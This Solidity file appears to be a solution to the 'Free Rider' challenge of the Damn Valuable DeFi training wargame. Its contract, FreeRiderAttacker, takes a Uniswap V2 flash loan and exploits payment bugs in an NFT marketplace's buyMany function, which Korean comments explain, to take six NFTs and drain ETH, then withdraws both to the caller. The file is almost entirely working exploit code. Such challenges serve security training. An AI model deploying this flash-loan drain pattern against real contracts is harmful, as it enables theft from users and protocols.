// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    
    IUniswapV2Pair immutable pair;
    WETH immutable weth;
    FreeRiderNFTMarketplace immutable marketplace;
    DamnValuableNFT immutable nft;

    constructor(
        IUniswapV2Pair _pair,
        FreeRiderNFTMarketplace _marketplace
    ) payable {
        pair = _pair;
        weth = WETH(payable(_pair.token0()));
        marketplace = _marketplace;
        nft = _marketplace.token();
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) override external {
        /* 돌파구1: FreeRiderNFTMarketplace 여기 컨트랙트의 대금 지불 로직에
         * 버그(개발자가 종종 할만한 인간다운 실수로 보임)가 있어서
         * NFT 구매 대금이 NFT 판매자에게 가야하는데 NFT 구매자한테 감. 
         * 
         * 돌파구2: 같은 컨트랙트의 NFT 여러개 한번에 매수하기 기능에
         * 버그(이것도 종종 할만한 실수)가 있어서
         * 구매대금이 여러 건 중 한 건만 청구되고, 부족분은 자체 보유자금으로 채워주는 오작동이 일어남.
         * 
         * 유니스왑에서 플래시론 받아서 주문금액 문턱만 넘으면 NFT 6개 다 털어가는 동시에 ETH까지 털어갈 수 있음 */

        weth.withdraw(weth.balanceOf(address(this)));

        uint256[] memory tokenIds = new uint256[](6);
        for (uint i = 0; i < 6; i++)
            tokenIds[i] = i;

        marketplace.buyMany{ value: 15 ether }(tokenIds);

        weth.deposit{ value: address(this).balance }();
        weth.transfer(address(pair), amount0 * 1000 / 997 + 1);
    }

    function withdrawAll() external {
        weth.withdraw(weth.balanceOf(address(this)));
        msg.sender.call{ value: address(this).balance }("");

        for (uint256 i = 0; i < 6; i++)
            nft.safeTransferFrom(address(this), msg.sender, i);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable { }
}